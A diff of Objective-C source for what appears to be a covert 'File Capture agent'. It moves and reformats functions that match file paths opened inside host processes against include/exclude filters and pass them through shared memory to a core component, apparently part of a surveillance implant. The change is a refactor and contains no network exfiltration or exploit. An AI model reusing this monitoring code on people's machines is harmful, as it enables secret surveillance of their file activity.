@@ -33,6 +33,29 @@ static NSDate *gFromDate            = nil;
 static NSMutableArray *gIncludeList = nil;
 static NSMutableArray *gExcludeList = nil;
 
+BOOL FCStopAgent()
+{
+  if (gIsFileCaptureActive == NO && gIsFileOpenActive == NO)
+  {
+#ifdef DEBUG_FILE_CAPTURE
+    warnLog(@"File Capture agent is already stopped");
+#endif
+    return YES;
+  }
+  
+  gIsFileOpenActive     = NO;
+  gIsFileCaptureActive  = NO;
+  
+  [gFromDate release];
+  [gIncludeList release];
+  [gExcludeList release];
+  
+  gIncludeList = nil;
+  gExcludeList = nil;
+  
+  return YES;
+}
+
 BOOL FCStartAgent()
 {
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
@@ -166,76 +189,213 @@ BOOL FCStartAgent()
   return success;
 }
 
-BOOL FCStopAgent()
-{
-  if (gIsFileCaptureActive == NO && gIsFileOpenActive == NO)
-    {
-#ifdef DEBUG_FILE_CAPTURE
-      warnLog(@"File Capture agent is already stopped");
-#endif
-      return YES;
-    }
-
-  gIsFileOpenActive     = NO;
-  gIsFileCaptureActive  = NO;
-
-  [gFromDate release];
-  [gIncludeList release];
-  [gExcludeList release];
-
-  gIncludeList = nil;
-  gExcludeList = nil;
-
-  return YES;
-}
-
-//
-// Returns 0 if the strings differs
-//
 int compareEntries(const unsigned char *wild, const unsigned char *string)
 {
   const unsigned char *cp = NULL, *mp = NULL;
-
+  
   while ((*string) && (*wild != '*'))
+  {
+    if ((toupper((unsigned int)*wild) != toupper((unsigned int)*string))
+        && (*wild != '?'))
     {
-      if ((toupper((unsigned int)*wild) != toupper((unsigned int)*string))
-          && (*wild != '?'))
-        {
-          return 0;
-        }
+      return 0;
+    }
+    wild++;
+    string++;
+  }
+  
+  while (*string)
+  {
+    if (*wild == '*')
+    {
+      if (!*++wild)
+      {
+        return 1;
+      }
+      mp = wild;
+      cp = string+1;
+    } 
+    else if ((toupper((unsigned int)*wild) == toupper((unsigned int)*string))
+             || (*wild == '?'))
+    {
       wild++;
       string++;
     }
-
-  while (*string)
+    else 
     {
-      if (*wild == '*')
-        {
-          if (!*++wild)
-            {
-              return 1;
-            }
-          mp = wild;
-          cp = string+1;
-        } 
-      else if ((toupper((unsigned int)*wild) == toupper((unsigned int)*string))
-               || (*wild == '?'))
-        {
-          wild++;
-          string++;
-        }
-      else 
-        {
-          wild = mp;
-          string = cp++;
-        }
+      wild = mp;
+      string = cp++;
     }
+  }
   while (*wild == '*')
-    {
-      wild++;
-    }
-
+  {
+    wild++;
+  }
+  
   return !*wild;
+}
+
+BOOL needToLogEntry(NSString *entry)
+{
+  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
+  BOOL needToLog = NO;
+  
+  if (gIncludeList == nil || gExcludeList == nil)
+  {
+#ifdef DEBUG_FILE_CAPTURE
+    errorLog(@"Filters are empty");
+#endif
+    
+    return needToLog;
+  }
+  
+  NSString *procToMatch = nil;
+  NSString *filter = entry;
+  
+#ifdef DEBUG_FILE_CAPTURE
+  infoLog(@"Checking       : %@", entry);
+#endif
+  
+  // Check if we have a proc name inside our filter
+  if ([entry rangeOfString: @"|"].location != NSNotFound)
+  {
+    procToMatch = [[entry componentsSeparatedByString: @"|"] objectAtIndex: 0];
+    filter      = [[entry componentsSeparatedByString: @"|"] objectAtIndex: 1];
+    
+    NSProcessInfo *processInfo  = [NSProcessInfo processInfo];
+    NSString *currentProc       = [[processInfo processName] copy];
+    
+    if ([procToMatch isEqualToString: currentProc] == NO)
+    {
+#ifdef DEBUG_FILE_CAPTURE
+      warnLog(@"Process name not matched, current (%@) required (%@)", currentProc, procToMatch);
+#endif
+      [currentProc release];
+      [outerPool release];
+      return needToLog;
+    }
+    else
+    {
+#ifdef DEBUG_FILE_CAPTURE
+      infoLog(@"Process matched (%@)", currentProc);
+#endif
+    }
+    
+    [currentProc release];
+  }
+  else
+  {
+#ifdef DEBUG_FILE_CAPTURE
+    warnLog(@"No process configured");
+#endif
+  }
+  
+  // Check include list
+  int i = 0;
+  for (; i < [gIncludeList count]; i++)
+  {
+    NSString *item = [gIncludeList objectAtIndex: i];
+#ifdef DEBUG_FILE_CAPTURE
+    infoLog(@"Checking %@ against INCLUDE filter %@", item, filter);
+#endif
+    if (compareEntries((const unsigned char *)[item UTF8String],
+                       (const unsigned char *)[filter UTF8String]))
+    {
+#ifdef DEBUG_FILE_CAPTURE
+      infoLog(@"Matched include (%@) for entry (%@)", filter, item);
+#endif
+      needToLog = YES;
+      break;
+    }
+  }
+  
+  // If we didn't find anything inside the include list just return
+  if (needToLog == NO)
+  {
+#ifdef DEBUG_FILE_CAPTURE
+    warnLog(@"No filter matched");
+#endif
+    return needToLog;
+  }
+  
+  // Check the exclude list
+  for (i = 0; i < [gExcludeList count]; i++)
+  {
+    NSString *item = [gExcludeList objectAtIndex: i];
+#ifdef DEBUG_FILE_CAPTURE
+    infoLog(@"Checking %@ against EXCLUDE filter %@", item, filter);
+#endif
+    if (compareEntries((const unsigned char *)[item UTF8String],
+                       (const unsigned char *)[filter UTF8String]))
+    {
+#ifdef DEBUG_FILE_CAPTURE
+      infoLog(@"Matched exclude (%@) for entry (%@)", filter, item);
+#endif
+      needToLog = NO;
+      break;
+    }
+  }
+  
+  [outerPool release];
+  return needToLog;
+}
+
+void logFileContent(NSString *filePath)
+{
+  NSString *tmpPath = filePath;
+  char nullTerminator = 0x00;
+  
+  if ([filePath rangeOfString: @"file://localhost"].location != NSNotFound)
+  {
+    tmpPath = [[filePath componentsSeparatedByString: @"file://localhost"]
+               objectAtIndex: 1];
+  }
+  else
+  {
+#ifdef DEBUG_FILE_CAPTURE
+    warnLog(@"Couldn't normalize path %@", filePath);
+#endif
+  }
+  
+  NSMutableData   *logData = [[NSMutableData alloc] initWithLength: sizeof(shMemoryLog)];
+  NSMutableData *entryData = [[NSMutableData alloc] init];
+  
+  // Filename UTF16 Null-terminated
+  [entryData appendData: [tmpPath dataUsingEncoding: NSUTF16LittleEndianStringEncoding]];
+  [entryData appendBytes: &nullTerminator
+                  length: sizeof(char)];
+  [entryData appendBytes: &nullTerminator
+                  length: sizeof(char)];
+  
+  shMemoryLog *shMemoryHeader     = (shMemoryLog *)[logData bytes];
+  shMemoryHeader->status          = SHMEM_WRITTEN;
+  shMemoryHeader->agentID         = AGENT_INTERNAL_FILECAPTURE;
+  shMemoryHeader->direction       = D_TO_CORE;
+  shMemoryHeader->commandType     = CM_LOG_DATA;
+  shMemoryHeader->flag            = 0;
+  shMemoryHeader->commandDataSize = [entryData length];
+  
+  memcpy(shMemoryHeader->commandData,
+         [entryData bytes],
+         [entryData length]);
+  
+  if ([mSharedMemoryLogging writeMemory: logData
+                                 offset: 0
+                          fromComponent: COMP_AGENT] == TRUE)
+  {
+#ifdef DEBUG_FILE_CAPTURE
+    verboseLog(@"File path to log sent (%@)", filePath);
+#endif
+  }
+  else
+  {
+#ifdef DEBUG_FILE_CAPTURE
+    errorLog(@"Error while sending file path to log (%@)", filePath);
+#endif
+  }
+  
+  [entryData release];
+  [logData release];
 }
 
 void logFileOpen(NSString *filePath)
@@ -367,169 +527,6 @@ void logFileOpen(NSString *filePath)
   [processName release];
   [entryData release];
   [logData release];
-}
-
-void logFileContent(NSString *filePath)
-{
-  NSString *tmpPath = filePath;
-  char nullTerminator = 0x00;
-
-  if ([filePath rangeOfString: @"file://localhost"].location != NSNotFound)
-    {
-      tmpPath = [[filePath componentsSeparatedByString: @"file://localhost"]
-                 objectAtIndex: 1];
-    }
-  else
-    {
-#ifdef DEBUG_FILE_CAPTURE
-      warnLog(@"Couldn't normalize path %@", filePath);
-#endif
-    }
-
-  NSMutableData   *logData = [[NSMutableData alloc] initWithLength: sizeof(shMemoryLog)];
-  NSMutableData *entryData = [[NSMutableData alloc] init];
-
-  // Filename UTF16 Null-terminated
-  [entryData appendData: [tmpPath dataUsingEncoding: NSUTF16LittleEndianStringEncoding]];
-  [entryData appendBytes: &nullTerminator
-                  length: sizeof(char)];
-  [entryData appendBytes: &nullTerminator
-                  length: sizeof(char)];
-
-  shMemoryLog *shMemoryHeader     = (shMemoryLog *)[logData bytes];
-  shMemoryHeader->status          = SHMEM_WRITTEN;
-  shMemoryHeader->agentID         = AGENT_INTERNAL_FILECAPTURE;
-  shMemoryHeader->direction       = D_TO_CORE;
-  shMemoryHeader->commandType     = CM_LOG_DATA;
-  shMemoryHeader->flag            = 0;
-  shMemoryHeader->commandDataSize = [entryData length];
-
-  memcpy(shMemoryHeader->commandData,
-         [entryData bytes],
-         [entryData length]);
-
-  if ([mSharedMemoryLogging writeMemory: logData
-                                 offset: 0
-                          fromComponent: COMP_AGENT] == TRUE)
-    {
-#ifdef DEBUG_FILE_CAPTURE
-      verboseLog(@"File path to log sent (%@)", filePath);
-#endif
-    }
-  else
-    {
-#ifdef DEBUG_FILE_CAPTURE
-      errorLog(@"Error while sending file path to log (%@)", filePath);
-#endif
-    }
-
-  [entryData release];
-  [logData release];
-}
-
-BOOL needToLogEntry(NSString *entry)
-{
-  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
-  BOOL needToLog = NO;
-
-  if (gIncludeList == nil || gExcludeList == nil)
-    {
-#ifdef DEBUG_FILE_CAPTURE
-      errorLog(@"Filters are empty");
-#endif
-
-      return needToLog;
-    }
-
-  NSString *procToMatch = nil;
-  NSString *filter = entry;
-
-#ifdef DEBUG_FILE_CAPTURE
-  infoLog(@"Checking       : %@", entry);
-#endif
-
-  // Check if we have a proc name inside our filter
-  if ([entry rangeOfString: @"|"].location != NSNotFound)
-    {
-      procToMatch = [[entry componentsSeparatedByString: @"|"] objectAtIndex: 0];
-      filter      = [[entry componentsSeparatedByString: @"|"] objectAtIndex: 1];
-
-      NSProcessInfo *processInfo  = [NSProcessInfo processInfo];
-      NSString *currentProc       = [[processInfo processName] copy];
-
-      if ([procToMatch isEqualToString: currentProc] == NO)
-        {
-#ifdef DEBUG_FILE_CAPTURE
-          warnLog(@"Process name not matched, current (%@) required (%@)", currentProc, procToMatch);
-#endif
-          [currentProc release];
-          [outerPool release];
-          return needToLog;
-        }
-      else
-        {
-#ifdef DEBUG_FILE_CAPTURE
-          infoLog(@"Process matched (%@)", currentProc);
-#endif
-        }
-
-      [currentProc release];
-    }
-  else
-    {
-#ifdef DEBUG_FILE_CAPTURE
-      warnLog(@"No process configured");
-#endif
-    }
-
-  // Check include list
-  int i = 0;
-  for (; i < [gIncludeList count]; i++)
-    {
-      NSString *item = [gIncludeList objectAtIndex: i];
-#ifdef DEBUG_FILE_CAPTURE
-      infoLog(@"Checking %@ against INCLUDE filter %@", item, filter);
-#endif
-      if (compareEntries((const unsigned char *)[item UTF8String],
-                         (const unsigned char *)[filter UTF8String]))
-        {
-#ifdef DEBUG_FILE_CAPTURE
-          infoLog(@"Matched include (%@) for entry (%@)", filter, item);
-#endif
-          needToLog = YES;
-          break;
-        }
-    }
-
-  // If we didn't find anything inside the include list just return
-  if (needToLog == NO)
-    {
-#ifdef DEBUG_FILE_CAPTURE
-      warnLog(@"No filter matched");
-#endif
-      return needToLog;
-    }
-  
-  // Check the exclude list
-  for (i = 0; i < [gExcludeList count]; i++)
-    {
-      NSString *item = [gExcludeList objectAtIndex: i];
-#ifdef DEBUG_FILE_CAPTURE
-      infoLog(@"Checking %@ against EXCLUDE filter %@", item, filter);
-#endif
-      if (compareEntries((const unsigned char *)[item UTF8String],
-                         (const unsigned char *)[filter UTF8String]))
-        {
-#ifdef DEBUG_FILE_CAPTURE
-          infoLog(@"Matched exclude (%@) for entry (%@)", filter, item);
-#endif
-          needToLog = NO;
-          break;
-        }
-    }
-
-  [outerPool release];
-  return needToLog;
 }
 
 @implementation myNSDocumentController : NSObject
